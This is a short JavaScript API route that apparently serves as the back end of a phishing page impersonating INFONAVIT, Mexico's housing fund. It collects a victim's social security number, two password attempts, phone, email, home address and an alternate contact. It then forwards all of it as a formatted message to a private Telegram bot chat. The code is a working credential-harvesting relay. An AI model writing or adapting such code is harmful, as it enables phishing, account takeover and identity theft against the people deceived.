export async function POST(req) {
  try {
    const {
      seguridad,
      clavePrimerIntento,
      claveSegundoIntento,
      celular,
      correo,
      postal,
      estado,
      delegacion,
      colonia,
      calle,
      exterior,
      interior,
      nombre,
      paterno,
      materno,
      cel,
    } = await req.json();

    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN_API;
    const TELEGRAM_BOT_CHAT_ID = process.env.TELEGRAM_BOT_CHAT_ID_API;

    const mensaje = `*-----DATOS INFONAVIT-----*\n*NUMERO DE SEGURIDAD:* ${seguridad}\n*CLAVE PRIMER INTENTO:* ${clavePrimerIntento}\n*CLAVE SEGUNDO INTENTO:* ${claveSegundoIntento}\n\n*-----DATOS DE CONTACTO-----*\n*CELULAR:* ${celular}\n*CORREO:* ${correo}\n\n*-----DIRECCIÓN DONDE VIVES ACTUALMENTE-----*\n*POSTAL:* ${postal}\n*ESTADO:* ${estado}\n*DELEGACIÓN:* ${delegacion}\n*COLONIA:* ${colonia}\n*CALLE:* ${calle}\n*EXTERIOR:* ${exterior}\n*INTERIOR:* ${interior}\n\n*-----PERSONA ALTERNATIVA DE CONTACTO-----*\n*NOMBRE:* ${nombre}\n*PATERNO:* ${paterno}\n*MATERNO:* ${materno}\n*CELULAR:* ${cel}
`;
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_BOT_CHAT_ID,
        text: mensaje,
        parse_mode: "Markdown",
      }),
    });

    const data = await response.json();

    if (!response.ok) {
      throw new Error(data.description || "Error al enviar el mensaje");
    }

    return Response.json({ success: true });
  } catch (error) {
    return Response.json({ success: false, error: error.message });
  }
}
